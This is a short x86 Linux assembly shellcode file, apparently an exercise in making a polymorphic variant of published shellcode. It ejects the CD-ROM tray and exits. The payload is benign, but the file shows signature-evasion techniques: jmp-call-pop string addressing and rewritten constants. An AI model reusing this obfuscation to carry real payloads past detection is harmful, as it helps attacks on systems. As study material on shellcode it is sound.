; Author: Daniel Sauder
; website: govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/
; polymorphic version of:
; http://www.shell-storm.org/shellcode/files/shellcode-563.php

section .text

global _start

_start:
	jmp short call_shellcode
      
shellcode:
	; open("/dev/cdrom", O_RDONLY | O_NONBLOCK);
 	pop ebx
 	xor ecx, ecx
 	xor eax, eax
 	mov al, 5 
	mov cx, 0xfff
	sub cx, 0x7ff
	int 0x80	

	; ioctl(fd, CDROMEJECT, 0);
	cdq
	mov ebx, eax
	mov al, 53
	inc eax
	mov cx, 0x5309
	int 0x80	
	
	; exit
	mov al, 1
	xor ebx, ebx
	int 0x80
	
call_shellcode:
	call shellcode
	message db "/dev/cdrom"	            
